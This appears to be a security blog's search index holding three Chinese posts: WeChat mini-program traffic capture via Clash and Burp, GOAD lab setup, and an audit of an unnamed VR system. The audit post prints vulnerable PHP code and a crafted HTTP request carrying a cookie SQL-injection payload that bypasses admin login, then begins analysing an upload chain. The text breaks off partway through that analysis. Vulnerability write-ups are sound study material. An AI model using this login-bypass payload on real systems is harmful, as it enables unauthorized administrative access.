<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>PC端微信小程序抓包</title>
    <link href="/posts/909b5a7d.html"/>
    <url>/posts/909b5a7d.html</url>
    
    <content type="html"><![CDATA[<h3 id="0x01-环境">0x01 环境</h3><p>Windows 10 x64 1908（需提前安装好BP证书至系统上<code>受信任的根证书颁发机构</code>中）</p><p>BurpSuite v2023.4.5</p><p>微信 v3.9.5.91</p><p>Clash for Windows v0.20.29</p><p><a href="https://github.com/Fndroid/clash_for_windows_pkg/releases">https://github.com/Fndroid/clash_for_windows_pkg/releases</a></p><h3 id="0x02-配置-Clash-for-Windows">0x02 配置 Clash for Windows</h3><p><code>General</code> -&gt; <code>Service Mode Manage</code> -&gt; <code>winsw</code> -&gt; <code>Install</code></p><p>安装 <code>Service Mode</code></p><p><img src="https://s1.ax1x.com/2023/07/22/pCqd1BV.png" alt=""></p><p>软件会重新启动，Service Mode 旁边的小地球变成绿色则代表成功安装Service Mode。</p><p>新建一个 <code>BP.yaml</code> 文件，写入如下内容：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">port:</span> <span class="hljs-number">7890</span><br><span class="hljs-attr">socks-port:</span> <span class="hljs-number">7891</span><br><span class="hljs-attr">allow-lan:</span> <span class="hljs-literal">false</span><br><span class="hljs-attr">mode:</span> <span class="hljs-string">Rule</span>                 <span class="hljs-comment"># 代理模式（Global, Rule, Direct）</span><br><span class="hljs-attr">log-level:</span> <span class="hljs-string">info</span>            <span class="hljs-comment"># 日志记录级别（silent, info, warning, error, debug）</span><br><span class="hljs-attr">external-controller:</span> <span class="hljs-string">:9090</span> <span class="hljs-comment"># Clash外部控制器的地址和端口</span><br><br><span class="hljs-attr">proxies:</span> <br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">burpsuite</span>        <span class="hljs-comment"># 代理名为 burpsuite</span><br>    <span class="hljs-attr">type:</span> <span class="hljs-string">http</span>             <span class="hljs-comment"># 代理类型</span><br>    <span class="hljs-attr">server:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>      <span class="hljs-comment"># Burp Suite地址</span><br>    <span class="hljs-attr">port:</span> <span class="hljs-number">8080</span>             <span class="hljs-comment"># Burp Suite端口</span><br><br><span class="hljs-attr">proxy-groups:</span>              <span class="hljs-comment"># 代理组</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">✨转发至</span>          <span class="hljs-comment"># 组名</span><br>    <span class="hljs-attr">proxies:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">burpsuite</span><br>    <span class="hljs-attr">type:</span> <span class="hljs-string">select</span><br><br><span class="hljs-attr">rules:</span><br>  <span class="hljs-comment"># 过滤微信垃圾数据，防止干扰</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">DOMAIN,szminorshort.weixin.qq.com,DIRECT</span> <br>  <span class="hljs-bullet">-</span> <span class="hljs-string">DOMAIN,long.open.weixin.qq.com,DIRECT</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">DOMAIN,res.wx.qq.com,DIRECT</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">DOMAIN-SUFFIX,qpic.cn,DIRECT</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">DOMAIN-SUFFIX,qlogo.cn,DIRECT</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">DOMAIN-SUFFIX,gtimg.cn,DIRECT</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">DOMAIN-SUFFIX,cdntips.net,DIRECT</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">DOMAIN-SUFFIX,weixinbridge.com,DIRECT</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">IP-CIDR,183.47.0.0/16,DIRECT</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment"># 过滤BP相关的进程-直连</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">PROCESS-NAME,java.exe,DIRECT</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">PROCESS-NAME,BurpSuitePro.exe,DIRECT</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment"># 把小程序主进程发起的请求转至BP</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">PROCESS-NAME,WeChatAppEx.exe,burpsuite</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">PROCESS-NAME,WechatBrowser.exe,burpsuite</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment"># 默认全部直连</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">MATCH,DIRECT</span><br><br></code></pre></td></tr></table></figure><p>如有使用其他代理工具，按需修改以上rules。</p><p>更多规则详细见：</p><p><a href="https://docs.cfw.lbyczf.com/contents/ui/profiles/rules.html">https://docs.cfw.lbyczf.com/contents/ui/profiles/rules.html</a></p><p><a href="https://www.codein.icu/clashtutorial/#%E7%BC%96%E8%BE%91%E8%A7%84%E5%88%99">https://www.codein.icu/clashtutorial/#编辑规则</a></p><h3 id="0x03-导入配置文件到-clash">0x03 导入配置文件到 clash</h3><p>把yaml文件导入 clash 并启用它：<code>Profiles</code> -&gt; <code>Import</code></p><p><img src="https://s1.ax1x.com/2023/07/22/pCqdln0.png" alt=""></p><h3 id="0x04-开启-TUN-Mode">0x04 开启 TUN Mode</h3><p>在 Clash for Windows 主界面或者右键通知栏clash图标开启 <code>System Proxy </code>和 <code>TUN Mode</code> 。</p><p><img src="https://s1.ax1x.com/2023/07/22/pCqdMXq.png" alt=""></p><p>注：成功开启 <code>TUN Mode</code> 的标志为Windows右下角网络会多出一个网卡连接。</p><p>微信不需要任何设置，打开burpsuite开始基操即可。</p><p><img src="https://s1.ax1x.com/2023/07/22/pCqdGAU.png" alt=""></p><p>注：如果抓到包有很多 mmtls 请求或只显示ip地址和端口不显示域名，又或者无法转抓包时，可以尝试</p><p>1、删除小程序文件夹下所有内容（默认在 <code>C:\Users\XXXX\Documents\WeChat Files\Applet</code> ）</p><p>2、多次重启Clash等。</p><p>Reference</p><p><a href="https://chat.openai.com">https://chat.openai.com</a><br><a href="https://www.google.com">https://www.google.com</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Windows下配置安装GOAD</title>
    <link href="/posts/ad6be596.html"/>
    <url>/posts/ad6be596.html</url>
    
    <content type="html"><![CDATA[<h3 id="0x01-环境">0x01 环境</h3><p>Win10：Vagrant+VMware Workstation Pro</p><p>Vagrant和Vagrant VMware Utility都需要安装。</p><p><a href="https://developer.hashicorp.com/vagrant/downloads/vmware">https://developer.hashicorp.com/vagrant/downloads/vmware</a></p><h3 id="0x02-操作">0x02 操作</h3><ul><li><p>修改Vagrant box默认位置</p><p>vagrant下载的box默认保存在 <code>C:\Users\.vagrant.d</code> ，会很占用系统盘。通过设置 <code>VAGRANT_HOME</code> 环境变量改变保存位置。</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 用户级别</span><br>setx VAGRANT_HOME <span class="hljs-string">&quot;E:\VagrantBox&quot;</span><br><span class="hljs-comment"># 系统级别</span><br>setx VAGRANT_HOME <span class="hljs-string">&quot;E:\VagrantBox&quot;</span> /M<br></code></pre></td></tr></table></figure><ul><li><p>Clone GOAD仓库</p><p>保存到和VAGRANT_HOME同一磁盘下，因为执行 vagrant up后，GOAD会占用28G左右的空间大小。</p></li></ul><p><code>git clone https://github.com/Orange-Cyberdefense/GOAD</code></p><ul><li><p>安装vmware-desktop插件</p><p>下载很慢，最好扶一下梯子。</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> GOAD<br>vagrant plugin install vagrant-vmware-desktop<br></code></pre></td></tr></table></figure><ul><li><p>修改 Vagrantfile</p><p>改为调用VMware创建虚拟机</p></li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Uncomment this depending on the provider you want to use</span><br><span class="hljs-comment">#ENV[&#x27;VAGRANT_DEFAULT_PROVIDER&#x27;] = &#x27;virtualbox&#x27;</span><br> <span class="hljs-string">ENV[&#x27;VAGRANT_DEFAULT_PROVIDER&#x27;]</span> <span class="hljs-string">=</span> <span class="hljs-string">&#x27;vmware_desktop&#x27;</span><br></code></pre></td></tr></table></figure><p>顺带修改下CPU与内存，电脑足够强可不修改，默认即可。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">config.vm.provider</span> <span class="hljs-string">&quot;vmware_desktop&quot;</span> <span class="hljs-string">do</span> <span class="hljs-string">|v|</span><br>    <span class="hljs-string">v.vmx[&quot;memsize&quot;]</span> <span class="hljs-string">=</span> <span class="hljs-string">&quot;4096&quot;</span><br>    <span class="hljs-string">v.vmx[&quot;numvcpus&quot;]</span> <span class="hljs-string">=</span> <span class="hljs-string">&quot;1&quot;</span><br>  <span class="hljs-string">end</span><br></code></pre></td></tr></table></figure><ul><li><p>修改ansible\hosts</p><p>注释 29-30行，开启33-34行</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yacas">; adapter created by vagrant and virtualbox (comment if you use vmware)<br>; nat_adapter=Ethernet<br>; domain_adapter=Ethernet 2<br><br>; adapter created by vagrant and vmware (uncomment if you use vmware)<br>nat_adapter=Ethernet0<br>domain_adapter=Ethernet1<br></code></pre></td></tr></table></figure><ul><li><p>构建VM</p><p>执行 <code>vagrant up</code> 创建并下载五个虚拟机。漫长的等待后显示以下内容，即表示所有vm已成功创建并运行。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">......<br>......<br>==&gt; SRV03: Machine booted and ready!<br>==&gt; SRV03: Configuring network adapters within the VM...<br>==&gt; SRV03: Configuring secondary network adapters through VMware<br>==&gt; SRV03: on Windows is not yet supported. You will need to manually<br>==&gt; SRV03: configure the network adapter.<br>==&gt; SRV03: Running provisioner: shell...<br>    SRV03: Running: vagrant/Install-WMF3Hotfix.ps1 as C:\tmp\vagrant-shell.ps1<br>==&gt; SRV03: Running provisioner: shell...<br>    SRV03: Running: vagrant/ConfigureRemotingForAnsible.ps1 as C:\tmp\vagrant-shell.ps1<br>    SRV03: Self-signed SSL certificate generated; thumbprint: 10A4A09077263394BE1DD002F54D8342A239E284<br>    SRV03:<br>    SRV03:<br>    SRV03: wxf                 : http://schemas.xmlsoap.org/ws/2004/09/transfer<br>    SRV03: a                   : http://schemas.xmlsoap.org/ws/2004/08/addressing<br>    SRV03: w                   : http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd<br>    SRV03: lang                : en-US<br>    SRV03: Address             : http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous<br>    SRV03: ReferenceParameters : ReferenceParameters<br>    SRV03:<br>    SRV03: Ok.<br>    SRV03:<br>    SRV03:<br>    SRV03:<br>==&gt; SRV03: Running provisioner: shell...<br>    SRV03: Running: vagrant/fix_ip.ps1 as C:\tmp\vagrant-shell.ps1<br>    SRV03:<br></code></pre></td></tr></table></figure><ul><li><p>添加虚拟机到Vmware控制页面</p><p>vnagrant创建完所有虚拟机会自动运行，但并不会添加到VMware中，需要手动添加才能看到（可不添加，添加到Vmware中只是为了直观看到虚拟机已经在运行）。</p></li></ul><p><code>VMware 文件 -&gt; 扫描虚拟机 </code>，位置选GOAD的machines，即：<code>E:\GOAD\.vagrant\machines</code>，结果如下图：</p><p><img src="https://cdnjson.com/images/2023/04/11/image-20230215225429968.png" alt="vm lists"></p><h3 id="0x03-运行ansible配置环境">0x03 运行ansible配置环境</h3><ul><li>手动新建一个Linux虚拟机直接运行ISO镜像无需安装（parrot os）</li><li>给Linux再添加一张仅主机模式网卡（Vmnet2）</li><li>把物理机上的 GOAD整个文件夹(不包括.vagrant)打包传到新建的 Linux中，执行：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> GOAD/ansible<br>sudo apt install python3.9-venv<br>python3 -m pip install virtualenv<br>python3.9 -m virtualenv .venv<br><span class="hljs-built_in">source</span> .venv/bin/activate<br>python3 -m pip install ansible-core==2.12.6<br>python3 -m pip install pywinrm<br></code></pre></td></tr></table></figure><ul><li>安装ansinle-galaxy依赖</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ansible-galaxy install -r requirements.yml<br></code></pre></td></tr></table></figure><ul><li>执行ansible开始配置环境</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ansible-playbook main.yml<br></code></pre></td></tr></table></figure><p>执行ansible配置环境需要很漫长的等待，并且很容报各种错误。报错原因无非就是网络问题以及虚拟机配置不足产生的。提高下配置，科学上网，然后反复执行ansible，直到没有红色报错即表示环境配置完成。</p><p><img src="https://cdnjson.com/images/2023/04/11/image-20230217010325229.png" alt="ansible"></p><p>配置完后，给攻击机配个网络让其连通环境即可开撸。</p><p>Reference</p><p><a href="https://xz.aliyun.com/t/12137">https://xz.aliyun.com/t/12137</a></p><p><a href="https://github.com/Orange-Cyberdefense/GOAD">https://github.com/Orange-Cyberdefense/GOAD</a></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>GOAD</tag>
      
      <tag>环境搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>某VR系统登陆绕过&amp;文件上传</title>
    <link href="/posts/54f87091.html"/>
    <url>/posts/54f87091.html</url>
    
    <content type="html"><![CDATA[<h3 id="0x01-前言">0x01 前言</h3><p>在翻看某报告时看到【xxx系统存在登录绕过和任意文件上传漏洞，可getshell】有点引人注目。</p><p>报告有些“简洁”，就几句话描述。</p><blockquote><p>通过信息收集，找到源码，对源码进行审计，发现存在远程代码执行漏洞和绕过登录漏洞。</p></blockquote><p>然后就是结果截图了，“完全看不懂”…那就本地搭个环境一探究竟。</p><h3 id="0x02-信息">0x02 信息</h3><p>首页界面这样子：</p><p><img src="https://s1.ax1x.com/2022/09/16/vzQpW9.png" alt=""></p><p>登录界面大概这样：</p><p><img src="https://s1.ax1x.com/2022/09/16/vzMjdU.png" alt=""></p><h3 id="0x03-后台登陆绕过">0x03 后台登陆绕过</h3><h4 id="分析">分析</h4><p>导入Seay自动审计，发现其中有一条SQL注入较为醒目：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from &quot;</span>.<span class="hljs-variable">$Base</span>-&gt;<span class="hljs-title function_ invoke__">table</span>(<span class="hljs-string">&#x27;admin&#x27;</span>).<span class="hljs-string">&quot; where id=&quot;</span>.<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;admin&#x27;</span>][<span class="hljs-string">&#x27;id&#x27;</span>].<span class="hljs-string">&quot;&quot;</span>;<br></code></pre></td></tr></table></figure><p>这是直接从cookie获取值进行SQL查询了？</p><p><img src="https://s1.ax1x.com/2022/09/16/vzMzi4.png" alt="9"></p><p>相应关键代码段：</p><p>vradmin/include/init.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php">......<br><span class="hljs-variable">$Json</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Json</span>;<br><span class="hljs-variable">$Db</span> = MyPDO::<span class="hljs-title function_ invoke__">getInstance</span>(<span class="hljs-variable">$db_host</span>,<span class="hljs-variable">$db_user</span>,<span class="hljs-variable">$db_pass</span>,<span class="hljs-variable">$db_name</span>,<span class="hljs-variable">$db_charset</span>);<br><span class="hljs-variable">$Base</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Base</span>(<span class="hljs-variable">$db_name</span>,<span class="hljs-variable">$db_prefix</span>);<br><br><span class="hljs-variable">$admin</span> = <span class="hljs-keyword">array</span>(<br> <span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>][<span class="hljs-string">&#x27;id&#x27;</span>]) ? <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>][<span class="hljs-string">&#x27;id&#x27;</span>]: <span class="hljs-number">0</span>,<br> <span class="hljs-string">&#x27;admin_name&#x27;</span> =&gt; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>][<span class="hljs-string">&#x27;admin_name&#x27;</span>]) ? <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>][<span class="hljs-string">&#x27;admin_name&#x27;</span>]: <span class="hljs-string">&#x27;&#x27;</span>,<br>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;admin&#x27;</span>][<span class="hljs-string">&#x27;id&#x27;</span>]&gt;<span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$admin</span>[<span class="hljs-string">&#x27;id&#x27;</span>]==<span class="hljs-number">0</span>)&#123; <br>   <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from &quot;</span>.<span class="hljs-variable">$Base</span>-&gt;<span class="hljs-title function_ invoke__">table</span>(<span class="hljs-string">&#x27;admin&#x27;</span>).<span class="hljs-string">&quot; where id=&quot;</span>.<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;admin&#x27;</span>][<span class="hljs-string">&#x27;id&#x27;</span>].<span class="hljs-string">&quot;&quot;</span>;<br>   <span class="hljs-variable">$u</span> = <span class="hljs-variable">$Db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>,<span class="hljs-string">&quot;Row&quot;</span>);<br><br>   <span class="hljs-variable">$hashcode</span> = <span class="hljs-title class_">Common</span>::<span class="hljs-title function_ invoke__">encrypt</span>(<span class="hljs-variable">$u</span>[<span class="hljs-string">&#x27;admin_name&#x27;</span>].<span class="hljs-variable">$u</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>]);<br>   <span class="hljs-keyword">if</span>(<span class="hljs-variable">$hashcode</span>==<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;admin&#x27;</span>][<span class="hljs-string">&#x27;hashcode&#x27;</span>])&#123;<br>     <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$u</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>]);<br> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>] = <span class="hljs-variable">$admin</span> = <span class="hljs-variable">$u</span>;<br>   &#125;<br>&#125;<br>......<br></code></pre></td></tr></table></figure><p>两个判断</p><p>1、判断cookie中的 <code>admin[id]</code> 是否大于0，以及 <code>$admin[id]</code> 的结果是否为0，都成立则执行SQL查询；</p><p>2、判断cookie中的 <code>admin[hashcode]</code> 是否跟<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mi>a</mi><mi>s</mi><mi>h</mi><mi>c</mi><mi>o</mi><mi>d</mi><mtext>一致，一致就销毁</mtext><mi>p</mi><mi>a</mi><mi>s</mi><mi>s</mi><mi>w</mi><mi>d</mi><mtext>，然后把从数据库查询到的结果</mtext></mrow><annotation encoding="application/x-tex">hashcod一致，一致就销毁passwd，然后把从数据库查询到的结果</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">ha</span><span class="mord mathnormal">s</span><span class="mord mathnormal">h</span><span class="mord mathnormal">co</span><span class="mord mathnormal">d</span><span class="mord cjk_fallback">一致，一致就销毁</span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">ss</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">d</span><span class="mord cjk_fallback">，然后把从数据库查询到的结果</span></span></span></span>u赋值给$admin，再赋值到session。</p><p>跟进 <code>Common::encrypt</code> 方法，发现其实就是 <code>admin_name</code> 和 <code>passwd</code> 拼接然后进行两次MD5。</p><p><img src="https://s1.ax1x.com/2022/09/16/vzQSJJ.png" alt=""></p><h4 id="测试">测试</h4><p><img src="https://s1.ax1x.com/2022/09/16/vzMvoF.png" alt=""></p><p>抓个登录包，Change body encoding</p><p>Cookie传入 <code>admin[hashcode]=7bfc85c0d74ff05806e0b5a0fa0c1df1; admin[id]=1 union select 2,1,1;</code></p><p>登录失败，账号密码不正确？</p><p><img src="https://s1.ax1x.com/2022/09/16/vzQisx.png" alt=""></p><p>开启MySQL监控</p><p><img src="https://s1.ax1x.com/2022/09/16/vzQPQ1.png" alt=""></p><p><img src="https://s1.ax1x.com/2022/09/16/vzQ9zR.png" alt=""></p><p>cookie中的联合查询确实是已经带入数据库进行查询了，为什么还是登录失败呢？</p><p>回头重新梳理，才发现，找错接口了。不是 <code>m=login</code>，而是 <code>m=user </code>接口。</p><p><img src="https://s1.ax1x.com/2022/09/16/vzQFL6.png" alt=""></p><h4 id="构建数据包">构建数据包</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">POST /vradmin/?m=user HTTP/1.1<br>Host: www.bing.com<br>Content-Length: 17<br>Accept: */*<br>X-Requested-With: XMLHttpRequest<br>User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36<br>Content-Type: application/x-www-form-urlencoded<br>Origin: http://www.bing.com<br>Referer: http://www.bingcom/vradmin/?m=login<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Cookie: admin[hashcode]=7bfc85c0d74ff05806e0b5a0fa0c1df1; admin[id]=2 union select 2,1,1;<br>Connection: close<br><br>atc=profile&amp;uid=2<br></code></pre></td></tr></table></figure><p>成功绕过登录</p><p><img src="https://s1.ax1x.com/2022/09/16/vzQAeK.png" alt=""></p><h3 id="0x04-后台文件上传">0x04 后台文件上传</h3><h4 id="任意文件上传">任意文件上传</h4><p>Seay 报了 <code>vradmin/upload.php</code> 存在文件上传功能，上传类型可控？</p><p>相应关键代码段</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php">......<br><span class="hljs-variable">$act</span> = <span class="hljs-title class_">Common</span>::<span class="hljs-title function_ invoke__">sfilter</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;act&#x27;</span>]);<br>......<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$act</span>==<span class="hljs-string">&#x27;article&#x27;</span>)&#123;<br><span class="hljs-variable">$dir_path</span> = <span class="hljs-string">&#x27;data/article/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Ym&#x27;</span>,<span class="hljs-title class_">Common</span>::<span class="hljs-title function_ invoke__">gmtime</span>());<br><span class="hljs-title class_">Common</span>::<span class="hljs-title function_ invoke__">make_dir</span>(<span class="hljs-variable">$dir_path</span>);<br><span class="hljs-variable">$file_path</span> = <span class="hljs-variable">$dir_path</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title class_">Common</span>::<span class="hljs-title function_ invoke__">gmtime</span>().<span class="hljs-string">&#x27;.png&#x27;</span>;<br><span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;error&#x27;</span>] = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;imgFile&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],<span class="hljs-variable">$file_path</span>))&#123;<br><span class="hljs-variable">$data</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;error&#x27;</span>=&gt;<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;url&#x27;</span>=&gt;<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_path</span>); <span class="hljs-comment">//返回路径</span><br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;message&#x27;</span>] = <span class="hljs-string">&#x27;上传失败！&#x27;</span>;<br>&#125;<br>&#125;<br>......<br></code></pre></td></tr></table></figure><p>如果 <code>act=article</code> 时，就继续处理请求，act作为POST和GET传参皆可。</p><p>路径为 <code>data/article/时间年月</code>，然后用当前时间戳作为文件名，上传文件类型有做限制，以 <code>data/article/时间年月/时间戳.png</code> 的格式保存，还蛮贴心的，成功上传就返回路径。</p><p><img src="https://s1.ax1x.com/2022/09/16/vzQEdO.png" alt=""></p><p>虽然，没有对上传类型进行限制，可上传任意文件。</p><p><img src="https://s1.ax1x.com/2022/09/16/vzQmJH.png" alt=""></p><p>但是保存时已经写死保存为.png了，也就是不能直接利用，需要结合其他漏洞，比如，文件包含？或者是后台系统升级功能有缺陷-可控。</p><p>vradmin/include/upgrade.php  升级解压功能</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 